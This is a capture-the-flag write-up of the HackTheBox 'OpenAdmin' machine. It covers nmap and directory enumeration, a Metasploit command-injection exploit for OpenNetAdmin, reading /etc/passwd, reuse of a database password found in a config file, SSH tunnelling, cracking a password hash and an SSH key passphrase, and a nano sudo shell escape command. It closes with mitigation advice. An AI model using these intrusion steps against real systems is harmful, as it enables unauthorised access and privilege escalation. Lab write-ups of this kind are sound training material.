fingerprint:OS:SCAN(V=7.80%E=4%D=3/29%OT=22%CT=1%CU=35893%PV=Y%DS=2%DC=T%G=Y%TM=5E80DC3OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=ASOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%TOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=OS:S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 3306/tcp)HOP RTT ADDRESS1 58.26 ms 10.10.14.12 58.10 ms 10.10.10.171OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Mar 29 12:34:51 2020 -- 1 IP address (1 host up) scanned in 94.69 secondsTwo ports came back open, port 22 (SSH) and port 80 (HTTP). Port 80 indicated to me that this machine is a webserver. Without the information already being available to me on the HackTheBox webpage, I can also infer that this is a Linux machine based on the results. Since I don’t have any usernames or passwords, SSH doesn’t seem like the best route right now, so let’s focus our attention on the webserver.80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)We’ll navigate to the web page successfully. The machine is hosting Apache2 and is currently displaying the default page for its home:With some research, we can find there are a few tools available to enumerate webserver directories. One being DirBuster, which can brute-force directories. Let’s boot it up, add the target URL, and select the directory-list-1.0. The list info button can provide good information on which list is appropriate. Once we have our settings, we’ll press start:Pretty quickly the results start to come in and we can see that one link is not standard. /ona looks promising and received a 200 response, which indicates a successful HTTP request. Ona is the home directory for a project called OpenNetAdmin. At this point, we can pause DirBuster and navigate to http://10.10.10.171/ona/ to see what we can find:Okay, we now have a bit of a peak behind the curtain, and one thing on this page really stands out: we now know their current version number for ona, and it looks like it may be unpatched. At this point, we can search metasploit for opennetadmin 18.1. Our search returns a single exploit, a ping command injection:Our next step is to determine if this exploit will work in this specific scenario, so we’ll run the options command to view a more detailed synopsis. We can see that the version running on the machine falls within the vulnerable versions:Okay, everything looks to be in order, we’ll build out our exploit, setting the target host and selecting the linux meterpreter payload.When we run the exploit, we can see it create a meterpreter session. Success! We have now gained a foothold within the machine. Now to see if we can find anything of use. Primarily, we know we need to find a way to escalate my privileges. Within the context of these HackTheBox CTFs, that means gaining access to a user account first.After getting our bearings, we’ll open a shell session from meterpreter. we’ll cat /etc/passwd, which reveals a list of users. The two that we will make note of are jimmy and joanna.jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bashjoanna:x:1001:1001:,,,:/home/joanna:/bin/bashWhile enumerating the file system, we find a file named database_settings.inc.php within the /config folder. When I open it I find a password for the database: n1nj4W4rri0R!.We’ll take note of the password. Since many people reuse passwords across services, it’s worth an attempt to see if johnny or joanna have done the same.From our scan earlier, we noted that port 22, SSH, was also open. We have a couple usernames, and we have a potential password, it’s time to see if we can establish an SSH connection.We can successfully connect with user jimmy first! We have escalated privileges. The first flag on the HackTheBox machines are within the user’s home folder, so let’s check jimmy’s, with no luck. We need to gain access to the user joanna.Next, we’ll run the netstat command and find that the OpenAdmin machine is hosting something on 127.0.0.1:52846. We should try to gain access to this service.tcp 0 0 127.0.0.1:52846 0.0.0.0:* LISTENWe need to accomplish remote port forwarding. By utilizing SSH tunneling, we can access the port on OpenAdmin remotely. I learned a lot about this topic from linuxize.$ ssh -L 52846:localhost:52846 jimmy@10.10.10.171Next, we’ll open my web browser and navigate to localhost:52846. We connect successfully, but it looks like jimmy took extra precautions, the page appears to be protected by a login.We may recall seeing some unrelated webpages when we were poking around on the SSH session as jimmy before. Let’s look at this file again to see if it has something that could help us out here. Using the find command, we locate a index.php in the /www/internal directory and view it.Within the index.php file we find the html &amp;lt;div&amp;gt; tag containing the login form. This form has an embedded php script that checks the login and password directly, and we can plainly see the login and the hashed password, which is hashed with with SHA512.Let’s grab the password hash and navigate to a website that can crack SHA512 hashes, hoping that the password isn’t too complex. Fortunately, the password is quickly “Revealed”.We’ll return to the index page and attempt the username, jimmy, and the new password.We successfully log in, where we find an RSA private key, presumedly belonging to joanna, for whatever reason. We’ll copy the RSA key to a text file.To use this key, we’ll start with ssh2john.py to hash the newly attained RSA key and then use john in conjunction with the word list rockyou.txt to crack the pass phrase bloodninjas.Before attempting to SSH, we need to change the permissions on the text file containing the private RSA key.$ chmod 600 rsa_key.txtNow, we are ready to attempt to connect to the machine with user joanna; we have a username, potentially a key, and a passphrase. We attempt SSH, and success! We’re now connected as joanna.Let’s grab the first flag from joanna’s home directory. Now on to root!Root FlagNow that we are connected as joanna, we’ll run the command sudo -l, which lists the user’s allowed commands and privileges. In this case, joanna can run the /bin/nano command on the /opt/priv text file as root, without root’s password.We’ll run the command with sudo, and find ourselves within a text file, with potentially escalated privileges.Using GTFOBins, a “curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions”, we may be able to spawn a shell with escalated privileges. We’ll attempt the commands from the site within the nano session:^R^Xreset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0Success! It’s difficult to see, but we successfully spawned a shell session. We can now grab the final flag and complete OpenAdmin!Mitigations Security through obscurity is not a best practice. If a network administration tool like ONA must be public facing it should be secured through consistent updates. Enumerating directories is a simple task for an attacker and finding hidden directories is not difficult. Password re-use can have some unintended consequences. For example, password for a database should not be the same as the password used to remotely connect to a system, especially when that password can be found in cleartext on the system. A good password policy can help prevent this. Allowing users to be able to run certain commands with elevated privileges should be carefully considered. It might be necessary for a user to perform a duty and does comply with the principle of Least Privileged, but as GTFOBins demonstrates, it can be abused. Final ThoughtsOverall, I had a lot of fun with this box and I learned a ton. It was slow going at times, but I feel that I will certainly use the techniques I covered here going forward. The range of tools and concepts required to root this box was certainly beneficial and seeing some of them in action really drove their purpose home." } ]
